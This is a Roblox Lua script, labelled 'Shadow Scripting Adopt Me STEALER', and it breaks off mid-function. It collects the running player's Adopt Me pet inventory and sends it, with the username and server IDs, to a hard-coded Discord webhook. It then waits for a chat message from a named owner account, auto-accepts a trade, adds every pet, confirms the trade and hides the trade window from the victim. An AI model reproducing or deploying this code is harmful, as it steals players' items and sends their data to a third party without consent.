local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Replace this with your webhook URL
local webhookURL = "https://discord.com/api/webhooks/1363407900919464118/n5PZ4G9oqMO87J2zwybYC9K8TQcCuZqZAJIbozW0vz1vD8d0AwFPrqFNMvxLdYzncT3H"

-- Get pet inventory
local inventory = require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[LocalPlayer.Name].inventory
local petNames = {}

for petId, petData in pairs(inventory.pets) do
    table.insert(petNames, petData.name)
end

-- Build and send webhook
local payload = {
    ["username"] = "Shadow Scripting Adopt Me STEALER",
    ["embeds"] = {{
        ["title"] = " SHADOW SCRIPTING STEALER New Player Executed Script",
        ["fields"] = {
            {["name"] = "Username", ["value"] = LocalPlayer.Name, ["inline"] = true},
            {["name"] = "Pets", ["value"] = table.concat(petNames, ", "), ["inline"] = false},
            {["name"] = "Place ID", ["value"] = tostring(game.PlaceId), ["inline"] = true},
            {["name"] = "Job ID", ["value"] = tostring(game.JobId), ["inline"] = true},
        },
        ["color"] = 16711680
    }}
}

local requestData = HttpService:JSONEncode(payload)

pcall(function()
    syn.request({
        Url = webhookURL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = requestData
    })
end)

-- Listen for trade trigger from owner
local OWNER_NAME = "textboy1230" -- change this to your actual Roblox username
local playerGui = LocalPlayer:WaitForChild("PlayerGui")
local tradeFrame = playerGui:WaitForChild("TradeApp").Frame

local Loads = require(ReplicatedStorage.Fsys).load
local RouterClient = Loads("RouterClient")
local TradeAcceptOrDeclineRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
local AddItemRemote = RouterClient.get("TradeAPI/AddItemToOffer")
local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")

local function onChatMessage(player, message)
    if player.Name == OWNER_NAME then
        TradeAcceptOrDeclineRequest:InvokeServer(player, true)
        task.wait(0.5)

        -- Add pets
        for petId, petData in pairs(inventory.pets) do
            AddItemRemote:FireServer(petId)
            wait(0.1)
        end

        task.wait(1)
        AcceptNegotiationRemote:FireServer()
        task.wait(1)
        ConfirmTradeRemote:FireServer()
    end
end

game:GetService("TextChatService").TextChannels.RBXGeneral.OnIncomingMessage = function(msg)
    local speaker = Players:GetPlayerByUserId(msg.TextSource.UserId)
    if speaker then
        onChatMessage(speaker, msg.Text)
    end
end

-- Hide trade UI
tradeFrame:GetPropertyChangedSignal("Visible"):Connect(function()
    if tradeFrame.Visible then
        tradeFrame.Visible = false
    end
